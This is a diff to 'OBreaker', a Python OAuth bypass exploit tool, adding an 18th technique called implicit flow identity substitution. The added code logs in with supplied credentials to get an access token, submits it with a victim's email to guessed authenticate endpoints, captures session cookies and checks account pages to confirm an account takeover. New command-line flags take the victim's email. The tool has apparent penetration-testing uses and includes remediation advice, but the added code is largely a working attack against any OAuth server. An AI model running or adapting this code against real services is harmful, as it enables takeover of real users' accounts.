@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-OBreaker v3.0 -- Generic OAuth Authorization Bypass Exploit Tool
+OBreaker v3.1 -- Generic OAuth Authorization Bypass Exploit Tool
 
-Full end-to-end Find, Forge, Fire (FFF) exploitation for 17 OAuth bypass techniques.
+Full end-to-end Find, Forge, Fire (FFF) exploitation for 18 OAuth bypass techniques.
 Works against ANY OAuth 2.0 / OpenID Connect server, not just specific testbeds.
 
 Modes:
@@ -142,7 +142,7 @@ def make_session() -> requests.Session:
     retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[502, 503])
     s.mount("https://", HTTPAdapter(max_retries=retry))
     s.mount("http://", HTTPAdapter(max_retries=retry))
-    s.headers["User-Agent"] = "OBreaker/3.0 (OAuth Security Scanner)"
+    s.headers["User-Agent"] = "OBreaker/3.1 (OAuth Security Scanner)"
     return s
 
 
@@ -286,7 +286,8 @@ class OAuthBreaker:
     def __init__(self, config: OAuthConfig, session: requests.Session,
                  profile: dict = None, auth_code: str = "",
                  code_verifier: str = "", credentials: tuple = None,
-                 refresh_token: str = "", verbose: bool = False):
+                 refresh_token: str = "", verbose: bool = False,
+                 victim_email: str = "", authenticate_url: str = ""):
         self.cfg = config
         self.s = session
         self.profile = profile
@@ -295,6 +296,8 @@ class OAuthBreaker:
         self.credentials = credentials  # (username, password) or None
         self.refresh_token = refresh_token
         self.verbose = verbose
+        self.victim_email = victim_email
+        self.authenticate_url = authenticate_url
         self.findings: list[Finding] = []
         # Cache: tokens obtained during scan (for chaining techniques)
         self._cached_token = ""
@@ -1951,6 +1954,265 @@ class OAuthBreaker:
             remediation="Require resource parameter per RFC 8707. Bind tokens to specific audiences.",
         )
 
+    # ── 18. Implicit Flow Identity Substitution ─────────────────────
+    def test_implicit_identity_sub(self) -> Optional[Finding]:
+        url = self.cfg.authorize_endpoint or f"{self.cfg.base_url}/authorize"
+        chain = []
+
+        # FIND: check if implicit flow (response_type=token) is accepted
+        params = {
+            "client_id": self.cfg.client_id or "test_client",
+            "redirect_uri": self.cfg.redirect_uri or f"{self.cfg.base_url}/cb",
+            "response_type": "token",
+            "scope": "openid profile email",
+            "state": secrets.token_hex(16),
+            "nonce": secrets.token_hex(16),
+        }
+        try:
+            r = self._get(url, params=params)
+        except Exception:
+            return None
+
+        body = r.text.lower()
+        implicit_accepted = (
+            self._accepted(r) or
+            (r.status_code in (400, 401) and "unsupported_response_type" not in body
+             and "response_type" not in body)
+        )
+        if r.status_code in (400,) and "unsupported_response_type" in body:
+            return None
+
+        # Extract token from redirect fragment if we got one directly
+        loc = r.headers.get("Location", "")
+        frag_token = ""
+        if "access_token=" in loc:
+            parsed = urllib.parse.urlparse(loc)
+            frag_qs = urllib.parse.parse_qs(parsed.fragment)
+            frag_token = frag_qs.get("access_token", [""])[0]
+
+        if not implicit_accepted and not frag_token:
+            return None
+
+        chain.append(ExploitStep(
+            phase="FIND",
+            action="Sent response_type=token (implicit flow) to authorize endpoint",
+            result=f"Implicit flow ACCEPTED (status {r.status_code})"
+                   + (f" -- token in redirect" if frag_token else " -- flow available"),
+            request=f"GET {url}?response_type=token",
+            response=f"{r.status_code} Location: ...access_token=..." if frag_token
+                     else f"{r.status_code} {self._error_body(r)[:80]}",
+        ))
+
+        # If no credentials or victim-email, report detection only
+        if not self.credentials or not self.victim_email:
+            severity = "high"
+            desc = (
+                "OAuth server accepts response_type=token (implicit flow). "
+                "RFC 9700 S2.1.2 says implicit flow MUST NOT be used. "
+                "Client apps consuming implicit tokens risk identity substitution "
+                "if they trust client-provided identity claims without server-side "
+                "token introspection."
+            )
+            if not self.victim_email:
+                desc += " Provide --victim-email and --credentials for full exploitation."
+            return Finding(
+                technique="Implicit Flow Identity Substitution", severity=severity,
+                title="Implicit flow enabled -- identity substitution risk (RFC 9700 violation)",
+                description=desc, chain=chain,
+                proof=ExploitProof(
+                    impact="IMPLICIT FLOW: Client apps may trust client-side identity claims, "
+                           "enabling email substitution for account takeover."),
+                remediation="Disable implicit flow. Use authorization code + PKCE. "
+                            "Server-side token introspection for identity claims.",
+            )
+
+        # FORGE: complete implicit flow to get a real token, then substitute identity
+        user, pw = self.credentials
+
+        # Try to complete the OAuth login flow to get a real access token
+        token = frag_token
+        if not token:
+            # Follow the authorize redirect to get login page, submit creds
+            try:
+                s2 = make_session()
+                login_r = s2.get(url, params=params, allow_redirects=True, timeout=15)
+                # Look for login form action
+                action_match = re.search(r'action=["\']([^"\']+)["\']', login_r.text)
+                if action_match:
+                    login_url = action_match.group(1)
+                    if not login_url.startswith("http"):
+                        parsed_base = urllib.parse.urlparse(login_r.url)
+                        login_url = f"{parsed_base.scheme}://{parsed_base.netloc}{login_url}"
+                    login_resp = s2.post(login_url, data={
+                        "username": user, "password": pw,
+                    }, allow_redirects=False, timeout=15)
+                    # Follow redirects manually to capture fragment
+                    for _ in range(10):
+                        next_loc = login_resp.headers.get("Location", "")
+                        if "access_token=" in next_loc:
+                            parsed = urllib.parse.urlparse(next_loc)
+                            frag_qs = urllib.parse.parse_qs(parsed.fragment)
+                            token = frag_qs.get("access_token", [""])[0]
+                            break
+                        if not next_loc:
+                            break
+                        login_resp = s2.get(next_loc, allow_redirects=False, timeout=10)
+            except Exception:
+                pass
+
+        if not token:
+            chain.append(ExploitStep(
+                phase="FORGE",
+                action="Attempted implicit flow login to obtain access token",
+                result="Could not extract token from implicit flow redirect",
+                success=False,
+            ))
+            return Finding(
+                technique="Implicit Flow Identity Substitution", severity="high",
+                title="Implicit flow enabled -- could not complete login for full exploit",
+                description="Implicit flow accepted but automated login flow could not extract token. "
+                            "Manual exploitation confirmed viable (submit creds, capture token from fragment, "
+                            "POST to authenticate with substituted email).",
+                chain=chain,
+                proof=ExploitProof(
+                    impact="IMPLICIT FLOW: Manual identity substitution possible."),
+                remediation="Disable implicit flow. Use authorization code + PKCE.",
+            )
+
+        # Verify token works by hitting userinfo
+        userinfo_url = self.cfg.userinfo_endpoint or ""
+        real_identity = {}
+        if userinfo_url:
+            try:
+                ui_r = self._get(userinfo_url, headers={"Authorization": f"Bearer {token}"})
+                if ui_r.status_code == 200:
+                    real_identity = ui_r.json()
+            except Exception:
+                pass
+
+        chain.append(ExploitStep(
+            phase="FORGE",
+            action=f"Obtained valid access token as {user} via implicit flow",
+            result=f"Token obtained. Real identity: {real_identity.get('email', user)}",
+            request="Implicit flow login completed",
+            response=f"access_token={token[:40]}...",
+        ))
+
+        # Now attempt identity substitution against the authenticate endpoint
+        auth_urls = []
+        if self.authenticate_url:
+            auth_urls.append(self.authenticate_url)
+        else:
+            base = self.cfg.base_url
+            auth_urls = [
+                f"{base}/authenticate", f"{base}/api/authenticate",
+                f"{base}/oauth-callback", f"{base}/api/login",
+                f"{base}/auth/callback", f"{base}/api/auth",
+            ]
+
+        substitution_payload = {
+            "email": self.victim_email,
+            "username": self.victim_email.split("@")[0],
+            "token": token,
+        }
+
+        for auth_ep in auth_urls:
+            try:
+                r = self._post(auth_ep, json=substitution_payload)
+                # Check for success indicators
+                got_session = "session" in (r.headers.get("Set-Cookie", "").lower())
+                is_redirect = r.status_code in (302, 303)
+                is_ok = r.status_code == 200
+
+                if got_session or (is_redirect and got_session) or is_ok:
+                    chain.append(ExploitStep(
+                        phase="FORGE",
+                        action=f"POST to {auth_ep} with substituted email={self.victim_email}",
+                        result=f"ACCEPTED (status {r.status_code})"
+                               + (" -- session cookie issued!" if got_session else ""),
+                        request=f"POST {auth_ep} {{email: {self.victim_email}, token: <attacker_token>}}",
+                        response=f"{r.status_code} Set-Cookie: {r.headers.get('Set-Cookie', 'none')[:80]}",
+                    ))
+
+                    if got_session:
+                        # FIRE: verify we're logged in as victim
+                        session_cookie = {}
+                        for cookie in r.cookies:
+                            session_cookie[cookie.name] = cookie.value
+
+                        # Try to access account page
+                        account_urls = [f"{self.cfg.base_url}/my-account",
+                                        f"{self.cfg.base_url}/account",
+                                        f"{self.cfg.base_url}/api/me"]
+                        victim_confirmed = False
+                        account_data = {}
+                        for acc_url in account_urls:
+                            try:
+                                acc_r = self.s.get(acc_url, cookies=session_cookie, timeout=10)
+                                if acc_r.status_code == 200 and self.victim_email.split("@")[0] in acc_r.text.lower():
+                                    victim_confirmed = True
+                                    account_data = {"url": acc_url, "contains_victim": True}
+                                    break
+                            except Exception:
+                                pass
+
+                        chain.append(ExploitStep(
+                            phase="FIRE",
+                            action=f"Accessed account as {self.victim_email}",
+                            result=f"IDENTITY SUBSTITUTION CONFIRMED" if victim_confirmed
+                                   else "Session obtained, victim identity unverified",
+                            request=f"GET /my-account with stolen session",
+                            response=f"Logged in as {self.victim_email}" if victim_confirmed else "session active",
+                            success=got_session,
+                        ))
+
+                        return Finding(
+                            technique="Implicit Flow Identity Substitution",
+                            severity="critical",
+                            title=f"Account takeover via implicit flow identity substitution"
+                                  f" -- logged in as {self.victim_email}",
+                            description=(
+                                f"Client app's {auth_ep} endpoint accepts client-provided email "
+                                f"without verifying it matches the OAuth token's actual identity. "
+                                f"Attacker obtains a valid token for their own account, substitutes "
+                                f"the victim's email ({self.victim_email}), and receives a session "
+                                f"as the victim."
+                            ),
+                            chain=chain,
+                            proof=ExploitProof(
+                                identity_obtained=self.victim_email,
+                                resource_accessed=got_session,
+                                impact=f"ACCOUNT TAKEOVER: Logged in as {self.victim_email} using "
+                                       f"attacker's token with substituted email. Backend trusts "
+                                       f"client-provided identity without token introspection.",
+                                token=token,
+                            ),
+                            remediation="Disable implicit flow. If implicit flow is required, "
+                                        "ALWAYS verify identity claims server-side via token introspection "
+                                        "or /userinfo. Never trust client-provided email/username.",
+                        )
+            except Exception:
+                continue
+
+        # Implicit flow works but no authenticate endpoint found
+        return Finding(
+            technique="Implicit Flow Identity Substitution", severity="high",
+            title="Implicit flow enabled -- identity substitution possible",
+            description=(
+                "OAuth server supports implicit flow (response_type=token). "
+                "Token obtained successfully. No authenticate endpoint found at common paths. "
+                "Provide --authenticate-url for the client app's login callback endpoint."
+            ),
+            chain=chain,
+            proof=ExploitProof(
+                impact="IMPLICIT FLOW: Token obtained. Identity substitution requires "
+                       "the client app's authenticate endpoint.",
+                token=token,
+            ),
+            remediation="Disable implicit flow. Use authorization code + PKCE. "
+                        "Server-side token introspection for identity claims.",
+        )
+
     # ── Run ─────────────────────────────────────────────────────────
     TECHNIQUES = [
         ("Response Mode Escape",                  "test_response_mode_escape"),
@@ -1970,12 +2232,13 @@ class OAuthBreaker:
         ("Code Replay",                           "test_code_replay"),
         ("Scope Creep at Refresh",                "test_scope_creep"),
         ("Resource Indicator Omission",           "test_resource_indicator"),
+        ("Implicit Flow Identity Substitution",  "test_implicit_identity_sub"),
     ]
 
     def run_all(self) -> list[Finding]:
         mode = "profile" if self.profile else "generic"
         print(f"\n{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
-        print(f"{C.CYAN}{C.BOLD}  |  OBreaker v3.0 -- OAuth Exploit Tool        |{C.RESET}")
+        print(f"{C.CYAN}{C.BOLD}  |  OBreaker v3.1 -- OAuth Exploit Tool        |{C.RESET}")
         print(f"{C.CYAN}{C.BOLD}  |  Find - Forge - Fire (Full Exploitation)    |{C.RESET}")
         print(f"{C.CYAN}{C.BOLD}  +=============================================+{C.RESET}")
         print(f"\n  {C.DIM}Target:  {self.cfg.base_url}{C.RESET}")
@@ -2027,6 +2290,7 @@ class OAuthBreaker:
             "code-replay": "test_code_replay",
             "scope-creep": "test_scope_creep",
             "resource": "test_resource_indicator",
+            "implicit-identity": "test_implicit_identity_sub",
         }
         method_name = key_map.get(key)
         if not method_name:
@@ -2127,7 +2391,7 @@ def save_json_report(findings: list[Finding], path: str):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="OBreaker v3.0 -- Generic OAuth Authorization Bypass Exploit Tool",
+        description="OBreaker v3.1 -- Generic OAuth Authorization Bypass Exploit Tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -2148,7 +2412,7 @@ Examples:
 """)
     parser.add_argument("--target", "-t", required=True, help="OAuth base URL")
     parser.add_argument("--technique", "-T", help="Run single technique by key")
-    parser.add_argument("--all", "-a", action="store_true", help="Run all 17 techniques")
+    parser.add_argument("--all", "-a", action="store_true", help="Run all 18 techniques")
     parser.add_argument("--profile", "-p", choices=list(PROFILES.keys()),
                         help="Use testbed-specific endpoint profile")
     parser.add_argument("--client-id", "-c", help="OAuth client_id")
@@ -2159,6 +2423,8 @@ Examples:
     parser.add_argument("--verifier", help="code_verifier for the pre-obtained code")
     parser.add_argument("--credentials", help="username:password for password grant testing")
     parser.add_argument("--refresh-token", help="Refresh token for scope creep testing")
+    parser.add_argument("--victim-email", help="Victim email for implicit flow identity substitution")
+    parser.add_argument("--authenticate-url", help="Client app's authenticate endpoint for implicit identity sub")
     parser.add_argument("--json", "-j", help="Save JSON exploit report")
     parser.add_argument("--verbose", "-v", action="store_true")
     parser.add_argument("--discover", "-d", action="store_true", help="Only run discovery")
@@ -2170,7 +2436,8 @@ Examples:
         keys = ["response-mode", "missing-state", "static-state", "predictable-state",
                 "pkce-plain", "no-verifier", "no-challenge", "confidential",
                 "aud-validation", "race", "prompt-none", "dcr", "mfa-bypass",
-                "auth-method", "code-replay", "scope-creep", "resource"]
+                "auth-method", "code-replay", "scope-creep", "resource",
+                "implicit-identity"]
         for k in keys:
             print(f"    {k}")
         return
@@ -2232,6 +2499,8 @@ Examples:
         credentials=creds,
         refresh_token=args.refresh_token or "",
         verbose=args.verbose,
+        victim_email=args.victim_email or "",
+        authenticate_url=args.authenticate_url or "",
     )
 
     if args.all:
